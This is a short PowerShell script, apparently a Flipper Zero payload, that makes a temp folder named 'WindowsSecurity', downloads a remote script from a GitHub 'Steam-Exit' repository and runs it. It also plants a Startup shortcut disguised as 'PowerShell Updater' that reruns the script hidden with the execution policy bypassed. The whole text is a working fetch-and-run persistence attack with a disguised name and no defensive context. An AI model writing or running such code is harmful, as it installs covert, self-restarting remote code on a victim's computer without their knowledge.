New-Item -Path $env:temp -Name "WindowsSecurity" -ItemType "directory"; Set-Location -Path "$env:temp/WindowsSecurity"

$FilePath = "$env:temp\WindowsSecurity\loop_exit.ps1"

$myDownloadUrl = "https://raw.githubusercontent.com/MattHinz03/Flipper-Scripts/main/Steam-Exit/exit_repeat.ps1"
Invoke-WebRequest $myDownloadUrl -OutFile $FilePath

$ShortcutPath = "$([Environment]::GetFolderPath('Startup'))\PowerShell Updater.lnk"
$ScriptPath = (Get-Item $FilePath).FullName
$WindowsPowerShell = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $WindowsPowerShell
$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
$Shortcut.IconLocation = $WindowsPowerShell
$Shortcut.WorkingDirectory = (Get-Item $WindowsPowerShell).DirectoryName
$Shortcut.Save()

& "$env:temp\WindowsSecurity\loop_exit.ps1"